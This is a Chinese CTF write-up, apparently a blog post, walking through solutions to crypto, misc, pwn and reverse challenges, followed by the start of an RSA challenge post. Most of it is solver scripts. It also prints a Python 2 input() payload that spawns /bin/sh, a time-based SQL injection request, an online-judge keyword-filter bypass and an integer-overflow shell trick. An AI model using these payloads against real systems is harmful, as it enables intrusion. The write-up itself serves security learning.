ciphertext1 = 0x16c95bd05e564b89e980dbf517d0f7c4# ciphertext2 = 0xe4d1e2ccf953490de0e894b47efead9c 简单的块分组密码，加密思路也跟DES分组密码差不多，通过一些置换、移位操作来达到扩散效果，而这部分是可逆的，唯一的非线性部分是s和的替代，这部分可以通过爆破s盒来反解出密钥，单轮也只需要进行16*16次计算即可爆破成功。 解体脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from libnum import n2ss = [0x7, 0x4, 0x9, 0xc, 0xb, 0xa, 0xd, 0x8, 0xf, 0xe, 0x1, 0x6, 0x0, 0x3, 0x2, 0x5]PL1 = [1, 3, 4, 6, 0, 2, 7, 5]invertPL1=[4,0,5,1,2,7,3,6]PR1 = [2, 7, 5, 0, 1, 6, 4, 3]invertPR1=[3,4,0,7,6,2,5,1]# def S(x, bit):# after_sbox = 0# for i in range(bit):# after_sbox ^= (s[(x &gt;&gt; i * 4) &amp; 0xf] &lt;&lt; i * 4)# return after_sboxdef leftrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &lt;&lt; num) ^ (left &gt;&gt; 32 - num)) &amp; 0xffffffff r = ((right &lt;&lt; num) ^ (right &gt;&gt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef invert_PL(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[invertPL1[i]] &lt;&lt; (7 - i) * 8) return resdef invert_PR(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[invertPR1[i]] &lt;&lt; (7 - i) * 8) return resdef rightrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &gt;&gt; num) ^ (left &lt;&lt; 32 - num)) &amp; 0xffffffff r = ((right &gt;&gt; num) ^ (right &lt;&lt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef decrypt(plaintext,cipher): key=0 x0, x1 = cipher &gt;&gt; 64, cipher &amp; 0xffffffffffffffff x1=invert_PR(x1) x0=invert_PL(x0) x0 = (x0 ^ x1) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 20)) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 8)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 8)) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 4)) &amp; 0xffffffffffffffff x1 = (x1 ^ x0) &amp; 0xffffffffffffffff x0_, x1_ = plaintext &gt;&gt; 64, plaintext &amp; 0xffffffffffffffff # print(x0_,x0) rk0=Boom(x0_,x0) rk1=Boom(x1_,x1) key=(rk0&lt;&lt;64)|rk1 # print(len(n2s(key))) return keydef Boom(pla,cip): tmp=0 #0~0xff key=0 for i in range(16): for tmp in range(16): if s[((pla &gt;&gt; i * 4) &amp; 0xf)^tmp]== (cip &gt;&gt; i * 4)&amp;0xf: key&lt;&lt;=4 key|=tmp break return int((hex(key)[2:])[::-1],16)key1=decrypt(0x0123456789abcdeffedcba9876543210,0x16c95bd05e564b89e980dbf517d0f7c4)key2=decrypt(0x0123456789abcdeffedcba9876543210,0xe4d1e2ccf953490de0e894b47efead9c)print(n2s(key1),n2s(key2))print(key1,key2)# print(hex(encrypt(0x0123456789abcdeffedcba9876543210,key1))) ez_des题目就不放了，（出题人的DES确实写的丑陋） 思想是单轮DES的破解，其实大致思路与上体Block相似，也是通过逆向操作和爆破S盒来还原密钥。不太相同的是因为采用了Feistel结构，大部分函数直接用就行，也不需要编写反函数，然后S盒的结构不太一样，导致需要对多组明密文对进行分析才能还原出密钥。 附上自己写的脚本：(早知网上有脚本就开抄了，耗了好多时间写这玩意) 还原密钥： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from libnum import n2sdef IP(data):#初始置换 L0=0 R0=0 for i in range(4): for j in range(58+2*i,1+2*i,-8): L0&lt;&lt;=1 L0|=((data&gt;&gt;(64-j))&amp;0x1) for i in range(4): for j in range(57+2*i,0+2*i,-8): R0&lt;&lt;=1 R0|=((data&gt;&gt;(64-j))&amp;0x1) return L0,R0def expandReplacement(data):#拓展置换E result=0 for i in range(8): result&lt;&lt;=1 if i==0: result|=data&amp;0x1 else: result+=(data&gt;&gt;(32-4*i))&amp;0x1 for j in range(4): result&lt;&lt;=1 result|=(data&gt;&gt;(32-(j+4*i+1)))&amp;0x1 result&lt;&lt;=1 if i==7: result|=(data&gt;&gt;31)&amp;0x1 else: result|=(data&gt;&gt;(32-(5+4*i)))&amp;0x1 #print(bin(result)) return resultdef sbox(data,i): result=0 sbox=[ [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]], [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]], [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]], [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]], [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]], [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,]], [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]], [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]] for _ in range(1):#row为行，column为列 row=(((data&gt;&gt;4)&amp;0b10))|(data&amp;1) column=((data&gt;&gt;1)&amp;0b1111) tmp=sbox[i][row][column] for j in range(4): result&lt;&lt;=1 result|=(tmp&gt;&gt;(4-(j+1)))&amp;0x1 return resultdef pbox(data,si): loc=[] table=[16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25] for i in range(si*4,4+si*4): loc.append(table.index(i+1)) return loc def invertPbox(data): invertTable=[9, 17, 23, 31, 13, 28, 2, 18, 24, 16, 30, 6, 26, 20, 10, 1, 8, 14, 25, 3, 4, 29, 11, 19, 32, 12, 22, 7, 5, 27, 15, 21] result=0 for i in range(32): result&lt;&lt;=1 result|=(data&gt;&gt;(32-invertTable[i]))&amp;0x1 return resultdef int2list(v):#转化为长度为8，每个数字大小为4位的数组 li=[] for i in range(8): li.append(v&amp;0xf) v&gt;&gt;=4 return li[::-1]def int2list2(v):#转化为长度为32的二进制数组 li=[] for i in range(32): li.append(v&amp;0b1) v&gt;&gt;=1 return li[::-1]def Boom(plaintext,ciphertext):#解密函数 L0_,R0_=IP(ciphertext) R0_=int2list2(R0_) L0_=int2list2(L0_) L0,R0=IP(plaintext) tmp=int2list2(L0) L0=R0 R0=expandReplacement(R0) roundKey1=[] for i in range(8): site=[] for key in range(64): tmpR0=((R0&gt;&gt;(42-6*i))^key)&amp;0b111111 #tmpR0 6位 key 6位 tmpR0=sbox(tmpR0,i) loc=pbox(tmpR0,i) tmpR0=((tmp[loc[0]]&lt;&lt;3)|(tmp[loc[1]]&lt;&lt;2)|(tmp[loc[2]]&lt;&lt;1)|(tmp[loc[3]]))^tmpR0 # print(tmpR0) if (tmpR0&gt;&gt;3)&amp;1==R0_[loc[0]] and (tmpR0&gt;&gt;2)&amp;1==R0_[loc[1]] and (tmpR0&gt;&gt;1)&amp;1==R0_[loc[2]] and (tmpR0&gt;&gt;0)&amp;1==R0_[loc[3]]: site.append(key) # print(loc) roundKey1.append(site) return roundKey1print((Boom(0x0123456789abcdef,0x2a138211ec75e47d)))print((Boom(0xfedcba9876543210,0xf74ed54cb9001180)))print((Boom(0xabcdef0123456789,0xdd465f0a99001bc4)))print((Boom(0x9876543210fedcba,0xee310a9baa7f46f5)))print((Boom(0xabcdefabcdefabcd,0xd5ec5f7f4c5f7d64))) 对爆破出来的可能密钥进行一个求交集的操作，最后一位补0/1，就得到了真正的密钥： 123456789101112131415from libnum import n2sa=[59,61,12,30,51,3,33,16]flag=''for i in a: flag+=bin(i)[2:].zfill(6)newflag=''j=0for i in range(55): if i%8==0: newflag+='0' else: newflag+=flag[j] j+=1newflag+='1'print(n2s(int(newflag,2))) fyh’s gift题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import hashlibfrom Crypto.Cipher import AESfrom secret import flagp = 1227746669897024584176049601139983199725970765368150228682221 a = 2b = 3E = EllipticCurve(GF(p), [a,b])G = E.gens()[0]def gen_key(): sk = randint(1, 2 ** 62) pk = G * sk return sk, pkdef gen_shared_secret(Q, n): return (Q * n)[0]def encrypt_flag(shared_secret): sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.encrypt(flag).hex()def decrypt_flag(secret_key, ciphertext): sha1 = hashlib.sha1() sha1.update(str(secret_key).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 enc = bytes.fromhex(ciphertext) cipher = AES.new(key, AES.MODE_CBC, iv) flag = cipher.decrypt(enc).decode() return flagalice_key = gen_key()bob_key = gen_key()print('Alice Public Key:', alice_key[1])# Alice Public Key: (302815835537564389018621724598932443372058309945965909258476 : 101620440267876945129965564956309591452288432027338930366277 : 1)print('Bob Public Key:', bob_key[1])# Bob Public Key: (65110746247642118366859050011022338368545596077949479875681 : 1017598375305367769482826313607595483103330800029116590734900 : 1)shared_secret = gen_shared_secret(alice_key[1], bob_key[0])ciphertext = encrypt_flag(shared_secret)print(ciphertext)# da4ba62b1dbcdf0d8b3df8b4e253d7ef328c6a37a7d6569e9c2c577d683e1ba12d83828fdf2b2b390da5d05558f8dbcb0796ef874000f87486d679aa0c954a75 第一次做ECC的题目…也第一次用sage，连函数都调不明白（菜） 看附件的话是ECDH密钥交换算法，密钥有62位大小。 看的时候想到暗泉杯有一题也是DH密钥交换，密钥42位，用大步小步法就可以解决掉。开始时想试试用这个能不能跑出来，结果跑一晚上显示内存不够跑不出来（/(ㄒoㄒ)/~~） 后来查资料，找到了这个简析ECC攻击方法之Pohlig-Hellman - 安全客，安全资讯平台 (anquanke.com)，这个算法能把复杂度降到O(p1^(1/2))，其中p1是阶数n的最大素因子。看一看阶数n的分解： 还可以，尝试一下就解出来了。注意需要去掉第一个因子和最后一个因子，否则跑出出来。 123456789101112131415161718192021222324print('start')M = 1227746669897024584176049601139983199725970765368150228682221 A = 2B = 3F = FiniteField(M)E = EllipticCurve(F,[A,B])G = E.gens()[0]Pub=E([302815835537564389018621724598932443372058309945965909258476 , 101620440267876945129965564956309591452288432027338930366277 ])Pub2=E([65110746247642118366859050011022338368545596077949479875681 , 1017598375305367769482826313607595483103330800029116590734900 ])factors, exponents = zip(*factor(E.order()))primes = [factors[i] ^ exponents[i] for i in range(len(factors))][1:-1]print(primes)dlogs = []print(G.order())for fac in primes: t = int(G.order()) // int(fac) dlog = discrete_log(t*Pub,t*G,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl = crt(dlogs,primes)print(l)print(l*G==Pub) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import hashlibfrom Crypto.Cipher import AESp = 1227746669897024584176049601139983199725970765368150228682221 a = 2b = 3E = EllipticCurve(GF(p), [a,b])G = E.gens()[0]def gen_key(): sk = randint(1, 2 ** 62) pk = G * sk return sk, pkdef gen_shared_secret(Q, n): return (Q * n)[0]def encrypt_flag(shared_secret): sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.encrypt(flag).hex()def decrypt_flag(secret_key, ciphertext): sha1 = hashlib.sha1() sha1.update(str(secret_key).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 enc = bytes.fromhex(ciphertext) cipher = AES.new(key, AES.MODE_CBC, iv) flag = cipher.decrypt(enc) return flagdef gen_shared_secret(Q, n): return (Q * n)[0]Pub1=E([302815835537564389018621724598932443372058309945965909258476 , 101620440267876945129965564956309591452288432027338930366277 ])Pub2=E([65110746247642118366859050011022338368545596077949479875681 , 1017598375305367769482826313607595483103330800029116590734900 ])cip='da4ba62b1dbcdf0d8b3df8b4e253d7ef328c6a37a7d6569e9c2c577d683e1ba12d83828fdf2b2b390da5d05558f8dbcb0796ef874000f87486d679aa0c954a75'sec=1727995788222408513Skey=gen_shared_secret(Pub2,sec)print(decrypt_flag(Skey,cip)) Misc太久不写Misc，已经没啥思路了 welcome easy_game一开始以为和Crypto的ez_game一样，准备套个脚本就上去搞，直到我整出了这个flag：flag{**} (lll￢ω￢) 再仔细看了一下题目和hint，发现题目使用python2写的，涉及到了input函数的漏洞：(29条消息) Python2中input()函数漏洞_SkYe231_的博客-CSDN博客_python2的input函数 python2中的input函数会将stdin输入的内容当作是代码去执行，例如输入1+2，input的返回值就是3，而不是“1+2”。这导致了我们可以向服务器输入恶意代码，做到任意代码执行，例如输入： 1__import__('os').system('/bin/sh') 就可以获得主机权限了。而在这题中，利用该漏洞找到flag位置即可cat flag了。 sqlmisc2sql盲注类型 开始搜索字符串’flag’，定位关键字段。发现是将数据库中的flag转为十六进制再转二进制后翻转一下，检测每一位是否为1，若该为等于1，则sleep(2)。 110.0.1.1 - - [01/Mar/2015:13:15:05 -0500] &quot;GET /alg.php?user=admin' AND IF(/*UrNa*/SUBSTRING(REVERSE(/*TG1CJuN*/CONV(HEX(SUBSTRING(/*AcRaD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*DS1FxfPA*/),1,1)),16,2))/*HqiOs*/,1,1)=1,SLEEP(2),14209) AND '59548 HTTP/1.1&quot; 200 431 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0&quot; 由此可以根据时间间隔去判断flag的每一位，拼接起来得到flag。 但不知道为啥，最终拼起来得到的flag不对-.-！ 问了一下出题人，才发现也可以根据包判断，即sleep(2)的时候程序会随便发一个包，可以根据那个来判断flag的位 脚本如下： 123456789101112131415161718192021222324import base64tmp=open('111.txt','r').read().split('\\n')flag=''i=0while(i&lt;len(tmp)-1): if len(tmp[i+1])-len(tmp[i])&gt;100: flag+='1' i+=2 else: flag+='0' i+=1reflag=''t=''print(len(flag))flag=flag[1:]for i in range(len(flag)): t+=flag[i] # print(t) if (i+1)%7==0: # print(t) reflag+=chr(int(t[::-1],2)) t='' print(reflag) PwnOr4ngeOj真·签到题 直接读取文件，在输出到屏幕上即可 1234567891011#include &lt;stdio.h&gt; int main(){printf(&quot;test&quot;);FILE *fp;fp=fopen(&quot;flag&quot;,&quot;r&quot;);char a[200];fscanf(fp,&quot;%s&quot;,a);printf(&quot;%s&quot;,a);} math_genius_revengeint类型的溢出，利用Min(int)/-1的异常 在最后一轮除法操作的时候，输入 -2147483648 -1即可getshell Or4ngeOJ-revengeOJ屏蔽了一些关键词：flag、open 利用宏定义和换行或字符数组可以绕过该检测 12345678910111213#include &lt;stdio.h&gt;#define test fo\\penint main(){char s[]={102,108,97,103,0};printf(&quot;test&quot;);FILE *fp;fp=test(s,&quot;r&quot;);char a[200];fscanf(fp,&quot;%s&quot;,a);printf(&quot;%s&quot;,a);} Reversecheckin简单的加密算法，注意一下输入格式即可逆出flag 1234567891011121314151617181920212223a=[0xB ,0x94, 0xBA, 0x4B, 0xAA, 0xA6, 0x65, 0x8C, 0x30, 0x93,0xE0, 0xA2, 0xCB, 0x50, 0xEB, 0xD2]trans=[0xE, 0x4, 0xD, 0x1, 0x2, 0xF, 0xB, 0x8, 0x3, 0xA, 0x6, 0xC, 0x5, 0x9,0x0, 0x7]mid=[0]*16for i in range(16): mid[trans[i]]=a[i]for i in range(16): mid[i]^=0x87flag=''for i in range(3,-1,-1): flag+=hex(mid[i])[2:]flag+='-'flag+=hex(mid[5])[2:]flag+=hex(mid[4])[2:]flag+='-'flag+=hex(mid[7])[2:]flag+=hex(mid[6])[2:]flag+='-'flag+=hex(mid[9])[2:].zfill(2)flag+=hex(mid[8])[2:].zfill(2)flag+='-'for i in range(10,16): flag+=hex(mid[i])[2:]print(flag) flowernc地址后得到的是一串base64字符串，解码后是一个elf可执行文件 看题目还以为考的是花指令…傻傻地分析了好久发现解出的flag不对，才发现每次nc给的程序的flag都不一样，并且只有30s的分析时间，否则就会关闭连接。 想起来之前用的符号执行的脚本，利用angr可以自动化分析并执行程序，写了个脚本就过了 123456789101112131415161718192021222324252627282930import angrimport claripyimport base64from pwn import *pr=remote(&quot;101.43.185.64&quot;,&quot;12345&quot;)flow=pr.recvuntil(b&quot;[+]&quot;)fp=open('./elf','wb')fp.write(base64.b64decode(flow))fp.close()p=angr.Project('./elf',load_options={&quot;auto_load_libs&quot;: False})f=p.factorystate = f.entry_state(addr=0x401156)#设置state开始运行时的地址flag = claripy.BVS('flag',8*32)#要求的内容有32个，用BVS转成二进制给flag变量sm = p.factory.simulation_manager(state)#准备从state开始遍历路径print(&quot;开始执行&quot;)sm.explore(find=0x401182)#遍历到成功的地址if sm.found: print(&quot;执行成功&quot;) x=sm.found[0].posix.dumps(0) [:32] print(x)else: print('错误')pr.sendafter(b&quot;key:&quot;,x)pr.interactive() flag{Thi5_m@Y_H3lp_y0u_Get_s7arted_1n_auto_REV} HiJackSMC加进程调用，拖进IDA，先分析Hi.exe 开始就发现程序对某个地方做了异或的处理 然后进入一个函数，其中创建了一个进程并调用了Jack.exe，并把之前作异或的那个地方写进了进程的内存。 对程序进行动调，看一下qword_140001000是干什么的，调整了一下，得到了关键部分的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152strcpy(v18, &quot;Congra&quot;); v10 = 0i64; v11 = 0; strcpy(v16, &quot;tulat&quot;); strcpy(v17, &quot;ions!&quot;); strcpy(v15, &quot;%s&quot;); strcpy(v6, &quot;Wrong!&quot;); v7[0] = 842283315; v7[1] = 825890350; v7[2] = 1060838448; v7[3] = 1008809520; v7[4] = 639384378; v7[5] = 976885268; v7[6] = 741605945; v7[7] = 1008548353; v7[8] = 1043739711; v7[9] = 808532502; v8 = 40; v9[0] = 0i64; v9[1] = 0i64; MEMORY[0x140001060](v15, v9); v1 = 0x140001000i64; v2 = 0x140001BF8i64; if ( (LOBYTE(v9[0]) ^ 0x33) != 85 ) goto LABEL_8; v12 = v0; v0 = 0i64;LABEL_3: if ( v0 == 40 ) { ((void (__fastcall *)(char *))v1)(v18); ((void (__fastcall *)(char *))v1)(v16); ((void (__fastcall *)(char *))v1)(v17); v3 = 0i64; goto LABEL_5; } while ( 1 ) { v4 = *((char *)v9 + ++v0); if ( (*((unsigned __int8 *)v7 + v0) ^ v4) == 85 ) goto LABEL_3; v0 = v12;LABEL_8: ((void (__fastcall *)(char *))v1)(v6); ((void (__fastcall *)(_QWORD))v2)(0i64); v1 = v13; v2 = v14; if ( v3 ) break;LABEL_5: ((void (__fastcall *)(CONTEXT *))v2)(v3); } 其中0x14000….这串地址可以发现是jack.exe中的地址，也就是说这部分处理的是调用Jack.exe中的函数 123MEMORY[0x140001060](v15, v9); v1 = 0x140001000i64;v2 = 0x140001BF8i64; 进到相关地址中，发现第一句实际上是scanf(“%s”,v9)，第二局实际上是printf函数,第三句实际上是，第三句实际上是exit()函数 那么代码逻辑很明显了，就是将 输入进行了一个异或处理，然后将其与v7中的数值进行比较，判断是否正确 做一个反向处理，注意一下大小端，即可获得flag 1234567891011v4=[0]*10v4 = [0x32,0x34,0x39,0x33,0x31,0x3A,0x16,0x2E,0x3F,0x3B,0x1C,0x30,0x3C,0x21,0x36,0x30,0x26,0x1C,0x3B,0x3A,0x3A,0x3A,0x16,0x14,0x2C,0x34,0x02,0x39,0x3C,0x1D,0x3A,0x01,0x3E,0x36,0x34,0x3F,0x30,0x31,0x3A,0x16]flag=''tmp=''for i in range(len(v4)): tmp+=chr(v4[i]^85) if (i+1)%4==0: flag+=tmp[::-1] tmp=''print(flag) dis_mepython逆向，先用pyinstxtractor整出pyc文件 在线反编译pyc文件，得到python源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationfrom libnum import s2nsbox = [ [ 214, 144, 233, 254, 204, 225, 61, 183, 22, 182, 20, 194, 40, 251, 44, 5], [ 43, 103, 154, 118, 42, 190, 4, 195, 170, 68, 19, 38, 73, 134, 6, 153], [ 156, 66, 80, 244, 145, 239, 152, 122, 51, 84, 11, 67, 237, 207, 172, 98], [ 228, 179, 28, 169, 201, 8, 232, 149, 128, 223, 148, 250, 117, 143, 63, 166], [ 71, 7, 167, 252, 243, 115, 23, 186, 131, 89, 60, 25, 230, 133, 79, 168], [ 104, 107, 129, 178, 113, 100, 218, 139, 248, 235, 15, 75, 112, 86, 157, 53], [ 30, 36, 14, 94, 99, 88, 209, 162, 37, 34, 124, 59, 1, 33, 120, 135], [ 212, 0, 70, 87, 159, 211, 39, 82, 76, 54, 2, 231, 160, 196, 200, 158], [ 234, 191, 138, 210, 64, 199, 56, 181, 163, 247, 242, 206, 249, 97, 21, 161], [ 224, 174, 93, 164, 155, 52, 26, 85, 173, 147, 50, 48, 245, 140, 177, 227], [ 29, 246, 226, 46, 130, 102, 202, 96, 192, 41, 35, 171, 13, 83, 78, 111], [ 213, 219, 55, 69, 222, 253, 142, 47, 3, 255, 106, 114, 109, 108, 91, 81], [ 141, 27, 175, 146, 187, 221, 188, 127, 17, 217, 92, 65, 31, 16, 90, 216], [ 10, 193, 49, 136, 165, 205, 123, 189, 45, 116, 208, 18, 184, 229, 180, 176], [ 137, 105, 151, 74, 12, 150, 119, 126, 101, 185, 241, 9, 197, 110, 198, 132], [ 24, 240, 125, 236, 58, 220, 77, 32, 121, 238, 95, 62, 215, 203, 57, 72]]CK = [ 462357, 472066609, 943670861, 1415275113, 1886879365, 0x8C939AA1L, 0xA8AFB6BDL, 0xC4CBD2D9L, 0xE0E7EEF5L, 0xFC030A11L, 404694573, 876298825, 1347903077, 1819507329, 0x888F969DL, 0xA4ABB2B9L, 0xC0C7CED5L, 0xDCE3EAF1L, 0xF8FF060DL, 337322537, 808926789, 1280531041, 1752135293, 0x848B9299L, 0xA0A7AEB5L, 0xBCC3CAD1L, 0xD8DFE6EDL, 0xF4FB0209L, 269950501, 741554753, 1213159005, 1684763257]def encrypt(data, key): x = [ 0] * 36 (x[0], x[1], x[2], x[3]) = (data &gt;&gt; 96, data &gt;&gt; 64 &amp; 0xFFFFFFFFL, data &gt;&gt; 32 &amp; 0xFFFFFFFFL, data &amp; 0xFFFFFFFFL) key = keyGenerator(key) cipher = x[35] &lt;&lt; 96 | x[34] &lt;&lt; 64 | x[33] &lt;&lt; 32 | x[32] return cipherdef decrypt(data, key): x = [ 0] * 36 (x[0], x[1], x[2], x[3]) = (data &gt;&gt; 96, data &gt;&gt; 64 &amp; 0xFFFFFFFFL, data &gt;&gt; 32 &amp; 0xFFFFFFFFL, data &amp; 0xFFFFFFFFL) key = keyGenerator(key) cipher = x[35] &lt;&lt; 96 | x[34] &lt;&lt; 64 | x[33] &lt;&lt; 32 | x[32] return cipherdef keyGenerator(key): k = [ 0] * 36 (k[0], k[1], k[2], k[3]) = (key &gt;&gt; 96, key &gt;&gt; 64 &amp; 0xFFFFFFFFL, key &gt;&gt; 32 &amp; 0xFFFFFFFFL, key &amp; 0xFFFFFFFFL) (k[0], k[1], k[2], k[3]) = (k[0] ^ 0xA3B1BAC6L, k[1] ^ 1453994832, k[2] ^ 1736282519, k[3] ^ 0xB27022DCL) return kdef T(data): (a0, a1, a2, a3) = (data &gt;&gt; 24, data &gt;&gt; 16 &amp; 255, data &gt;&gt; 8 &amp; 255, data &amp; 255) (b0, b1, b2, b3) = (sbox_subtitute(a0), sbox_subtitute(a1), sbox_subtitute(a2), sbox_subtitute(a3)) data = b0 &lt;&lt; 24 | b1 &lt;&lt; 16 | b2 &lt;&lt; 8 | b3 data = move_left(data, 2) ^ move_left(data, 10) ^ move_left(data, 18) ^ move_left(data, 24) ^ data return datadef sbox_subtitute(data): return sbox[data &gt;&gt; 4][data &amp; 15]def move_left(data, bit): data = data &lt;&lt; bit &amp; 0xFFFFFFFFL | data &gt;&gt; 32 - bit return datadef T_key(key): (a0, a1, a2, a3) = (key &gt;&gt; 24, key &gt;&gt; 16 &amp; 255, key &gt;&gt; 8 &amp; 255, key &amp; 255) (b0, b1, b2, b3) = (sbox_subtitute(a0), sbox_subtitute(a1), sbox_subtitute(a2), sbox_subtitute(a3)) key = b0 &lt;&lt; 24 | b1 &lt;&lt; 16 | b2 &lt;&lt; 8 | b3 key = move_left(key, 13) ^ move_left(key, 23) ^ key return keydef main(): flag = input('input your flag:') if len(flag) &lt; 22 or len(flag) &gt; 38: print('wrong length!') return None# WARNING: Decompyle incompletemain() 熟悉的话其实可以看出是SM4的加密算法，但由于反编译不完整，有部分代码没有反编译出来，还需要通过字节码分析 由于已经反编译出一部分代码，字节码部分选择关键部分看即可 oneQuiz拖进jadx，定位到MainActivity，发现加密函数，找到密钥和密文，扔到AES解密网站上一解就得到了flag","link":"/2022/04/01/BUAACTF-2022-WP/"},{"title":"Crypto 1","text":"[GKCTF 2021]RRRRsa下载附件，得到task.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Util.number import *from gmpy2 import gcdflag = b'xxxxxxxxxxxxx'p = getPrime(512)q = getPrime(512)m = bytes_to_long(flag)n = p*qe = 65537c = pow(m,e,n)print('c={}'.format(c))p1 = getPrime(512)q1 = getPrime(512)n1 = p1*q1e1 = 65537assert gcd(e1,(p1-1)*(q1-1)) == 1c1 = pow(p,e1,n1)print('n1={}'.format(n1))print('c1={}'.format(c1))hint1 = pow(2020 * p1 + q1, 202020, n1)hint2 = pow(2021 * p1 + 212121, q1, n1)print('hint1={}'.format(hint1))print('hint2={}'.format(hint2))p2 = getPrime(512)q2 = getPrime(512)n2 = p2*q2e2 = 65537assert gcd(e1,(p2-1)*(q2-1)) == 1c2 = pow(q,e2,n2)hint3 = pow(2020 * p2 + 2021 * q2, 202020, n2)hint4 = pow(2021 * p2 + 2020 * q2, 212121, n2)print('n2={}'.format(n2))print('c2={}'.format(c2))print('hint3={}'.format(hint3))print('hint4={}'.format(hint4))#c=13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758#n1=75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829#c1=68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569#hint1=23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951#hint2=52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270#n2=1145359230433759703801179205480974047290430798955403207428478403644550240504731259989263116441729601764711936028504276078991918106169530213247421374927461599212849821463201753563953258904077046970184124563508629908496062003230847173526302825391566706360259244258657411965